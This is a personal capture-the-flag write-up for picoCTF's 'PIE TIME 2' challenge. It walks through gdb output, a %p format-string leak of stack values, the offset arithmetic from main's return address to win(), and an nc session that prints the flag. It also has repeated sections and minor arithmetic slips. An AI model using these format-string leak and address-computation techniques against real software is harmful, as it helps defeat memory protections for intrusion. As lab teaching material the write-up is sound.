```c
Breakpoint 1, 0x00005555555552cf in call_functions ()
(gdb) print &main
$3 = (<text variable, no debug info> *) 0x555555555400 <main>
(gdb) print &win
$4 = (<text variable, no debug info> *) 0x55555555536a <win>
(gdb) c
Continuing.
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x555555559011 0x7ffff7e0b7a0 0x7ffff7e0b7a0 0x55555555904f (nil) 0x34000000340 0x7ffff7e0a5c0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 (nil) 0x63a01cdd3af77b00 0x7fffffffd210 0x555555555441 0x7fffffffd2b0 0x7ffff7c27675
 enter the address to jump to, ex => 0x12345: 55555555536a
You won!
Praise The Sun! \[T]/
[Inferior 1 (process 493583) exited normally]
(gdb)

```

0x555555555441 is our main return address
0x555555555400 - 0x555555555441 = 0x41

Then difference between main and win:
0x555555555400 - 0x55555555536a = 0x96

0x41 + 0x96 = 0xd7

This should be the offset between the return address and win
0x555555555441 - 0xd7 = 0x55555555536a
as required.

```c

󰣇 Pico/Binary/Pie 2 ❯ nc rescued-float.picoctf.net 60207                                                                  ℂ -gcc  3.13.5  15:02 
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5ecf96da72a1 (nil) 0x5ecf96da72df 0x7fff30dd8730 0x7c 0x72540cdea238 0x72540cddc6a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 0x5ecf712451c0 0xb3c4d671a109e600 0x7fff30dd8790 0x5ecf71245441 (nil) 0x72540cc13083
 enter the address to jump to, ex => 0x12345: 5ecf7124536a
You won!
picoCTF{p13_5h0u1dn'7_134k_1e55cd55}
```

Noting that:
0x5ecf71245441 - 0xd7 = 0x5ecf7124536a


---
Aside
![[Pasted image 20250825151458.png]]

Normally to view addresses in c we use the following:
`printf("value: %p", &variable);`
But if we leave out the second argument like so:
`printf("value: %p");` printf see's %p and goes looking for the variable, but since we specify no variables it does following:
print the contents of rdi
for each %p we move through the potential argument registers starting from rdi, ending with r9.
Once we reach the 6th argument we start looking at the stack (rsp)
each consecutive %p will print a value moving down the stack (stack grows down)

Things that can potentially go on the stack. 
- Return addresses (where to return after function is done executing)
- Previous frame pointers.
- Callers registers. 
- Local variables
- Function arguments
- Spilled registers
- Padding
- Stack canaries
- Shadow Space (windows executable)
- Red Zones
- Exception pointers
- Cpu state
- Thread information
- Environment variables (near the end of the stack as it get's placed in first)
- Other stuff aswell probably (the stack is kinda a hoe ngl)


---
# Write up
PIE TIME 2
Rev engineering

Goal of the challenge is to jump to the address of the win function. To do this we need to examine the binary they gave gave us, somehow extract an address, then figure out how far that address is from the win function. This address will change each time we run the program so the offset this address and win is the main goal 

source code has the following:
```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
```

Normally to view addresses in c we use the following:
`printf("value: %p", &variable);`
But if we leave out the second argument like so:
`printf("value: %p");` printf see's %p and goes looking for the variable, but since we specify no variables it assumes the variables are on the stack

for each %p we feed into the input, printf moves through potential argument registers starting from rdi through r9 (argument 1-6 in x86 arch) then moving into the stack pointer and starts printing out the addresses it encounters.
So after the 6th %p we start printing values from the stack pointer (rsp)
Each consecutive %p will print a value moving down the stack (stack grows down)

Things that can potentially go on the stack. 
- Return addresses (where to return after function is done executing)
- Previous frame pointers.
- Callers registers. 
- Local variables
- Function arguments
- Spilled registers
- Padding
- Stack canaries
- Shadow Space (windows executable)
- Red Zones
- Exception pointers
- Cpu state
- Thread information
- Environment variables (near the end of the stack as it get's placed in first)
- Other stuff aswell probably (the stack is kinda a hoe ngl)


Running the binary they gave us with gdb we can gather the following info:
```bash
Breakpoint 1, 0x00005555555552cf in call_functions ()
(gdb) print &main
$3 = (<text variable, no debug info> *) 0x555555555400 <main>
(gdb) print &win
$4 = (<text variable, no debug info> *) 0x55555555536a <win>
(gdb) c
Continuing.
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x555555559011 0x7ffff7e0b7a0 0x7ffff7e0b7a0 0x55555555904f (nil) 0x34000000340 0x7ffff7e0a5c0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 (nil) 0x63a01cdd3af77b00 0x7fffffffd210 0x555555555441 0x7fffffffd2b0 0x7ffff7c27675

enter the address to jump to, ex => 0x12345: 
```

Our goal is to jump into the win function which is currently at `0x55555555536a` on my machine but will be somewhere else on the host machine we connect to with netcat.

We're currently in the "call_functions" function which we enter through main like so:
```c
int main() {
  signal(SIGSEGV, (__sighandler_t) segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```
So the stack should have a return address saved to the memory location for "return 0"

Using gdb we know that main is at `0x555555555400` 
Examining the output from the %p's we can spot `0x555555555441` which should our return address since that's closest to main. hence `0x555555555441` points to "return 0" in memory.

The offset between the start of main from the gdb output and return 0 is then
0x555555555441 - 0x555555555400 = 0x41

And the offset between main and win is:
0x555555555400 - 0x55555555536a =  0x96

So in theory the offset between "return 0" and the main function should be:
0x41 + 0x96 = d7

Since we know the address of win we can quickly check this:
address of return address (return 0) - d7 = address of win
https://www.gigacalculator.com/calculators/hexadecimal-calculator.php
0x555555555441 - 47 = 55555555536a
Which is what we see in gdb.

**Connecting to the machine**:
Running the program again gives us the following:

```c

󰣇 Pico/Binary/Pie 2 ❯ nc rescued-float.picoctf.net 60207                                                                  ℂ -gcc  3.13.5  15:02 
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5ecf96da72a1 (nil) 0x5ecf96da72df 0x7fff30dd8730 0x7c 0x72540cdea238 0x72540cddc6a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 0x5ecf712451c0 0xb3c4d671a109e600 0x7fff30dd8790 0x5ecf71245441 (nil) 0x72540cc13083
 enter the address to jump to, ex => 0x12345: 
```

5ecf71245441 - d7 = 5ecf7124536a


```c

󰣇 Pico/Binary/Pie 2 ❯ nc rescued-float.picoctf.net 60207                                                                  ℂ -gcc  3.13.5  15:02 
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5ecf96da72a1 (nil) 0x5ecf96da72df 0x7fff30dd8730 0x7c 0x72540cdea238 0x72540cddc6a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 0x5ecf712451c0 0xb3c4d671a109e600 0x7fff30dd8790 0x5ecf71245441 (nil) 0x72540cc13083
 enter the address to jump to, ex => 0x12345: 5ecf7124536a
You won!
picoCTF{...
```


